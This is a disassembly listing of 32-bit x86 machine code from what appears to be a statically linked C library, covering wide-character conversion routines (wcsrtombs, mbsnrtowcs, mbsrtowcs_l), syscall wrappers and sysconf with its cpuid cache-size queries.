test ebx, ebx
mov eax, 0x80aa9bc
cmovne eax, ebx
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08078440
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8077da1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0x80aa9c4
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
test eax, eax
cmovne edx, eax
mov eax, 0
test eax, eax
mov dword [var_28h], edx
je 0x80780c4
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x80780a4
mov edx, dword [arg_8h]
mov esi, dword [eax + 8]
test edx, edx
je 0x8077fc0
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080783a0
mov ecx, dword [arg_ch]
mov edx, eax
mov eax, dword [ecx]
lea edi, [eax + edx*4 + 4]
mov eax, dword [arg_8h]
mov dword [var_3ch], eax
add eax, dword [arg_10h]
mov dword [var_38h], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_ch]
lea eax, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], edi
mov dword [esp], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
call dword [esi + 0x14]
mov ecx, eax
mov eax, dword [var_3ch]
mov ebx, eax
sub ebx, dword [arg_8h]
test ecx, ecx
je 0x8077f59
cmp ecx, 4
je 0x8077f59
nop
test ecx, ecx
jne 0x8077f01
add esp, 0x168
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x8077f26
test ecx, ecx
je 0x8077ef4
cmp ecx, 5
je 0x8077ef4
cmp ecx, 4
je 0x8077ef4
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077ef4
cmp ecx, 6
je 0x8077f06
cmp ecx, 7
je 0x8077f06
cmp ecx, 5
je 0x8077f06
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x88
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
cmp byte [eax - 1], 0
jne 0x8077ef0
cmp eax, dword [arg_8h]
je 0x8077f9d
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077f7c
mov eax, dword [arg_ch]
mov dword [eax], 0
dec ebx
jmp 0x8077ef0
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7d
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x8077f54
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7c
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf____unsigned_char___dst
jmp 0x8077f54
mov esi, esi
mov eax, dword [arg_ch]
lea edi, [var_13ch]
mov ebx, dword [eax]
mov dword [esp], ebx
call fcn.08077690
mov dword [var_14ch], ebx
lea eax, [ebx + eax*4 + 4]
xor ebx, ebx
mov dword [var_154h], eax
mov eax, dword [var_28h]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [esi + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_154h]
lea ecx, [var_148h]
lea edx, [var_14ch]
mov dword [var_14h], ecx
mov dword [var_8h], edx
mov dword [var_sp_1ch], 1
lea ecx, [var_3ch]
mov dword [var_18h], 0
mov dword [var_10h], 0
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov dword [esp], esi
call dword [esi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, edi
add ebx, eax
cmp ecx, 5
je 0x8078008
test ecx, ecx
je 0x8078076
cmp ecx, 4
jne 0x8077ef0
cmp byte [edx - 1], 0
je 0x8077f76
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x5f
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf__1___0
jmp 0x8077f54
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8077e5e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077e5e
mov eax, dword [0x80a9ab4]
jmp 0x8077e51
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aa9cc
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x15c
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov edx, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_30h], 0
mov edi, dword [arg_8h]
mov dword [var_2ch], 1
test edx, edx
cmovne eax, edx
mov dword [var_28h], eax
xor eax, eax
test ecx, ecx
je 0x8078208
mov edx, dword [arg_ch]
lea eax, [ecx - 1]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076f30
mov edx, dword [arg_ch]
add eax, dword [edx]
inc eax
mov dword [var_148h], eax
mov eax, 0
test eax, eax
je 0x8078391
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078371
test edi, edi
mov ebx, dword [eax]
je 0x80782d6
mov eax, dword [arg_14h]
mov dword [var_3ch], edi
lea eax, [edi + eax*4]
mov dword [var_38h], eax
mov eax, dword [ebx + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_140h]
mov edx, dword [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, dword [var_3ch]
sub esi, edi
sar esi, 2
mov edx, eax
test eax, eax
je 0x8078270
cmp eax, 4
je 0x8078270
test edx, edx
jne 0x8078213
mov eax, esi
add esp, 0x15c
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x807823d
test edx, edx
je 0x8078206
cmp edx, 5
je 0x8078206
cmp edx, 4
je 0x8078206
cmp edx, 7
je 0x8078206
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078206
cmp edx, 6
je 0x8078218
cmp edx, 7
je 0x8078218
cmp edx, 5
je 0x8078218
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x81
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
test esi, esi
je 0x80782b5
mov ecx, dword [edi + esi*4 - 4]
test ecx, ecx
jne 0x8078202
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8078294
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078202
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x76
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x807826b
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x73
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.result___0
jmp 0x807826b
mov edx, dword [arg_ch]
xor esi, esi
lea edi, [var_13ch]
mov eax, dword [edx]
mov dword [var_144h], eax
lea eax, [var_3ch]
mov dword [var_38h], eax
nop
mov eax, dword [ebx + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_148h]
lea edx, [var_140h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], edx
mov dword [var_18h], 0
mov dword [var_10h], 0
lea edx, [var_144h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], edx
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov ecx, dword [var_3ch]
mov edx, eax
mov eax, ecx
sub eax, edi
sar eax, 2
add esi, eax
cmp edx, 5
je 0x80782f0
test edx, edx
je 0x8078361
cmp edx, 4
jne 0x8078202
mov ebx, dword [ecx - 4]
test ebx, ebx
jne 0x8078202
jmp 0x807828e
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x807818e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x807818e
mov eax, dword [0x80a9ab4]
jmp 0x8078181
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
cmp dword [ecx], 0
je 0x80783e0
test edx, edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
dec edx
cmp dword [ecx + eax*4], 0
je 0x80783e0
test edx, edx
jne 0x80783b4
mov esi, esi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, dword [edx]
test eax, eax
je 0x807840d
nop
cmp eax, ecx
je 0x807840d
add edx, 4
mov eax, dword [edx]
test eax, eax
jne 0x8078400
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
mov dword [var_34h], 1
mov esi, dword [arg_10h]
mov dword [var_28h], eax
mov eax, dword [arg_18h]
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078738
mov edi, dword [eax]
mov eax, dword [arg_8h]
test eax, eax
je 0x8078650
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
test esi, esi
mov ecx, 5
mov ebx, dword [eax]
mov dword [var_3ch], edx
lea eax, [edx + esi*4]
mov dword [var_38h], eax
mov dword [var_150h], ebx
je 0x8078642
mov eax, dword [var_150h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076f30
lea esi, [eax + ebx + 1]
mov eax, dword [edi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_148h]
lea edx, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [edi + 0x14]
cmp eax, 4
mov ecx, eax
je 0x8078520
cmp eax, 7
jne 0x8078642
mov ebx, dword [var_150h]
cmp ebx, esi
jne 0x807863a
cmp byte [ebx - 1], 0
je 0x807863a
mov eax, dword [var_38h]
mov edx, dword [var_3ch]
sub eax, edx
sar eax, 2
test eax, eax
mov esi, eax
jne 0x80784b2
mov esi, edx
mov eax, dword [arg_ch]
sub esi, dword [arg_8h]
mov dword [eax], ebx
sar esi, 2
test ecx, ecx
je 0x80785d1
cmp ecx, 4
je 0x80785d1
test ecx, ecx
jne 0x8078574
add esp, 0x168
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x807859e
test ecx, ecx
je 0x8078567
cmp ecx, 5
je 0x8078567
cmp ecx, 4
je 0x8078567
cmp ecx, 7
je 0x8078567
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078567
cmp ecx, 6
je 0x8078579
cmp ecx, 7
je 0x8078579
cmp ecx, 5
je 0x8078579
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x9b
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
mov edx, dword [arg_8h]
mov edx, dword [edx + esi*4 - 4]
test edx, edx
jne 0x8078563
test esi, esi
je 0x8078619
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x80785f8
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078563
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x90
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x80785cc
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x8f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.result___0
jmp 0x80785cc
mov edx, dword [var_3ch]
jmp 0x807854d
mov edx, dword [var_3ch]
mov ebx, dword [var_150h]
jmp 0x807854d
mov eax, dword [arg_ch]
xor esi, esi
mov ebx, dword [eax]
mov dword [var_14ch], ebx
mov dword [esp], ebx
call fcn.08053400
lea ebx, [eax + ebx + 1]
mov eax, dword [var_28h]
mov dword [var_154h], ebx
lea ebx, [var_13ch]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [edi + 0x14]
mov dword [var_3ch], ebx
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_154h]
lea eax, [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_14ch]
mov dword [esp], edi
mov dword [var_ch], edx
mov dword [var_8h], eax
lea edx, [var_3ch]
mov dword [var_4h], edx
call dword [edi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, ebx
sar eax, 2
add esi, eax
cmp ecx, 5
je 0x8078698
test ecx, ecx
je 0x8078709
cmp ecx, 4
jne 0x8078563
mov ebx, dword [edx - 4]
test ebx, ebx
je 0x80785f2
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x5f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__wchar_t___data.__outbuf___1___L0
jmp 0x80785cc
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8078481
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8078481
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 8
test eax, eax
mov dword [ebp - 4], ebx
je 0x80787a3
mov dword [esp], 0x80a9be0
call section.
mov ebx, dword [ebp - 4]
leave
ret
mov eax, 2
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80787b7
mov eax, ebx
jmp 0x807879e
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x80787b3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078815
mov eax, 0x18
int 0x80
leave
ret
mov eax, 0xc7
int 0x80
cmp eax, 0xfffff000
jbe 0x8078813
cmp eax, 0xffffffda
jne 0x8078813
mov dword [0x80a9c10], 1
jmp 0x807880c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078855
mov eax, 0x31
int 0x80
leave
ret
mov eax, 0xc9
int 0x80
cmp eax, 0xfffff000
jbe 0x8078853
cmp eax, 0xffffffda
jne 0x8078853
mov dword [0x80a9c10], 1
jmp 0x807884c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078895
mov eax, 0x2f
int 0x80
leave
ret
mov eax, 0xc8
int 0x80
cmp eax, 0xfffff000
jbe 0x8078893
cmp eax, 0xffffffda
jne 0x8078893
mov dword [0x80a9c10], 1
jmp 0x807888c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x80788d5
mov eax, 0x32
int 0x80
leave
ret
mov eax, 0xca
int 0x80
cmp eax, 0xfffff000
jbe 0x80788d3
cmp eax, 0xffffffda
jne 0x80788d3
mov dword [0x80a9c10], 1
jmp 0x80788cc
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [var_8h_2]
sub eax, 0xb9
cmp eax, 0xd
ja case.default.0x8078913
jmp dword [eax*4 + 0x80a2e60]
mov eax, 0x2000
nop
leave
ret
xor eax, eax
jmp 0x8078920
mov eax, 0x10
jmp 0x8078920
mov eax, 0xffffffff
jmp 0x8078920
mov eax, str.cannot_happen
test eax, eax
je case.0x8078913.191
mov dword [var_4h_2], str.handle_i486
mov dword [var_8h_3], 0x3d
mov dword [var_ch_2], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.___cannot_happen_
call fcn.0805efc0
jmp 0x8078970
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [var_8h_3]
mov edx, dword [eax]
mov eax, dword [var_ch_2]
cmp dword [eax], edx
je 0x8078986
sbb eax, eax
or eax, 1
leave
ret
xor eax, eax
jmp 0x8078984
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
test ebx, ebx
js 0x8078a17
lea ecx, [edi - 0xb9]
mov edx, 0x55555556
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sub edx, eax
test ebx, ebx
lea esi, [edx + edx*2 + 0xb9]
je 0x8078a15
movzx eax, bl
cmp eax, 0x40
je 0x8078a44
mov dword [var_2ch], eax
mov dword [var_10h], 0x8078970
mov dword [var_ch], 0x14
lea eax, [var_2ch]
mov dword [var_8h], 0x1f
mov dword [var_4h], 0x80a2ea0
mov dword [esp], eax
call fcn.08062e40
test eax, eax
je 0x8078a10
mov edx, dword [eax + 4]
cmp edx, esi
je 0x8078a27
cmp edx, 0xbf
je 0x8078a1f
nop
shr ebx, 8
jne 0x80789c6
xor eax, eax
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_ch]
mov byte [eax], 1
jmp 0x8078a10
sub edi, edx
je 0x8078a3f
cmp edi, 1
je 0x8078a3a
cmp edi, 2
jne 0x8078a54
mov eax, dword [eax + 0x10]
jmp 0x8078a17
mov eax, dword [eax + 0xc]
jmp 0x8078a17
mov eax, dword [eax + 8]
jmp 0x8078a17
mov eax, dword [arg_14h]
cmp esi, 0xc2
mov byte [eax], 1
jne 0x8078a10
jmp 0x8078a15
mov dword [var_ch], str.intel_check_word
mov dword [var_8h], 0xad
mov dword [var_4h], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.offset__2
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
cmp dword [var_8h], 1
jbe 0x8078b60
mov dword [var_18h], 1
mov byte [var_dh], 0
mov byte [var_eh], 0
mov dword [var_14h], 1
lea edi, [var_dh]
lea esi, [var_eh]
nop
mov eax, 2
xchg ebx, ebx
cpuid
xchg ebx, ebx
cmp dword [var_14h], 1
mov dword [var_20h], edx
mov dword [var_1ch], ecx
je 0x8078b71
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], ebx
mov dword [esp], eax
call fcn.08078990
test eax, eax
jne 0x8078b62
mov edx, dword [var_1ch]
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], edx
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_20h]
mov edx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_14h]
inc dword [var_14h]
cmp eax, dword [var_18h]
jb 0x8078ab0
mov eax, dword [var_4h]
sub eax, 0xbf
cmp eax, 5
ja 0x8078b60
cmp byte [var_dh], 0
jne 0x8078b6a
nop
xor eax, eax
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0xffffffff
jmp 0x8078b62
movzx edx, al
xor al, al
mov dword [var_18h], edx
jmp 0x8078acb
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch_2], ebx
mov dword [var_4h_2], edi
mov dword [var_8h_3], esi
mov ebx, 0x80000000
mov edi, dword [var_8h_2]
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
xor ecx, ecx
cmp edi, 0xc1
mov dword [var_4h_3], eax
jg 0x8078c00
xor ebx, ebx
cmp edi, 0xbf
setge bl
sub ebx, 0x7ffffffb
cmp dword [var_4h_3], ebx
jb 0x8078c00
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
cmp edi, 0xbb
mov dword [var_14h_2], edx
mov ebx, ecx
jg 0x8078bdc
add edi, 3
mov ebx, edx
lea eax, [edi - 0xbc]
cmp eax, 5
ja case.default.0x8078beb
jmp dword [eax*4 + 0x80a310c]
mov ecx, ebx
shr ecx, 0xe
and ecx, 0x3fc00
lea esi, [esi]
mov ebx, dword [var_sp_ch]
mov esi, dword [var_34h]
mov eax, ecx
mov edi, dword [var_30h]
leave
ret
shr ebx, 0x10
movzx eax, bl
cmp eax, 0xff
mov ecx, eax
jne 0x8078c00
lea ecx, [ebx*4]
jmp 0x8078bf7
movzx ecx, bl
jmp 0x8078c00
xor eax, eax
test bx, 0xf000
je 0x8078c3d
mov eax, ebx
shr eax, 6
and eax, 0x3fffc00
mov ecx, eax
jmp 0x8078c00
shr ebx, 0xc
mov eax, ebx
and eax, 0xf
cmp eax, 0xf
ja case.0x8078c4e.3
jmp dword [eax*4 + 0x80a3124]
mov ecx, ebx
and ecx, 0xf
jmp 0x8078c00
mov ecx, 8
jmp 0x8078c00
mov ecx, 0x10
jmp 0x8078c00
xor ecx, ecx
jmp 0x8078c00
mov ecx, ebx
shl ecx, 6
and ecx, 0x3fffc00
jmp 0x8078c00
movzx eax, bl
xor ecx, ecx
test bx, 0xf000
cmovne ecx, eax
jmp 0x8078c00
mov eax, str.cannot_happen
mov ecx, 0xffffffff
test eax, eax
je 0x8078c00
mov dword [var_8h_4], str.handle_amd
mov dword [var_ch_3], 0x13c
mov dword [var_10h], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.___cannot_happen_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi - 0xb9]
cmp eax, 0xe
ja 0x8078d98
pushfd
pop eax
mov edx, 0x240000
xor edx, eax
push edx
popfd
pushfd
pop edx
xor edx, eax
push eax
popfd
test edx, edx
mov eax, 0xffffffff
je 0x8078d39
and edx, 0x200000
je 0x8078d86
xor ebx, ebx
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
cmp esi, 0x756e6547
mov dword [var_2ch], edx
mov dword [var_14h], ecx
mov dword [var_10h], esi
je 0x8078d68
cmp dword [var_10h], 0x68747541
je 0x8078d44
xor eax, eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
cmp dword [var_14h], 0x444d4163
jne 0x8078d37
cmp dword [var_2ch], 0x69746e65
jne 0x8078d37
mov dword [var_ch_2], edi
mov ebx, dword [var_ch_3]
mov esi, dword [var_8h_4]
mov edi, dword [var_4h_3]
leave
jmp 0x8078b80
cmp ecx, 0x6c65746e
jne 0x8078d2e
cmp edx, 0x49656e69
jne 0x8078d2e
mov dword [esp + 4], eax
mov dword [esp], edi
call fcn.08078a80
jmp 0x8078d39
mov dword [var_8h_2], edi
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
jmp 0x8078900
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8078db0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
cmp dword [var_8h_2], 3
je 0x8078eb4
cmp dword [var_8h_2], 0x22
je 0x8078ddc
mov edx, dword [var_8h_2]
mov dword [esp], edx
call fcn.08078ec0
add esp, 0x38
pop ebx
pop esi
pop edi
leave
ret
mov ebx, str._proc_sys_kernel_rtsig_max
test ebx, ebx
je 0x8078dc9
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x8078ea1
cmp esi, 0xffffffff
je 0x8078dc9
lea edi, [var_2ch]
mov ebx, esi
mov ecx, edi
mov edx, 0x1f
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_34h], eax
ja 0x8078e88
cmp dword [var_34h], 0xffffffff
jne 0x8078e2d
call fcn.08048b20
cmp dword [eax], 4
je 0x8078e03
mov ebx, esi
mov eax, 6
int 0x80
mov eax, dword [var_34h]
test eax, eax
jle 0x8078dc9
mov eax, dword [var_34h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [esp], edi
mov byte [eax + ebp - 0x2c], 0
lea eax, [var_30h]
mov dword [var_sp_4h], eax
call fcn.080494c0
mov edx, dword [var_30h]
cmp edx, edi
je 0x8078dc9
movzx edx, byte [edx]
test dl, dl
je 0x8078dd4
cmp dl, 0xa
jne 0x8078dc9
jmp 0x8078dd4
call fcn.08048b20
neg dword [var_34h]
mov edx, dword [var_34h]
mov dword [var_34h], 0xffffffff
mov dword [eax], edx
jmp 0x8078e1d
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8078dfb
mov ebx, str._proc_sys_kernel_ngroups_max
jmp 0x8078de1
mov esi, esi
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
cmp eax, 0xc6
ja case.0x8078ecd.41
jmp dword [eax*4 + 0x80a3164]
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
leave
ret
mov eax, 0x20000
jmp 0x8078ee4
mov eax, 0x3e7
jmp 0x8078ee4
leave
jmp loc.0807ac30
mov eax, 0x20
jmp 0x8078ee4
leave
jmp loc.0807a020
mov eax, 0x10
jmp 0x8078ee4
call fcn.0808dee0
cmp eax, 6
jle 0x8078f1e
leave
jmp fcn.0808dee0
mov eax, 6
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
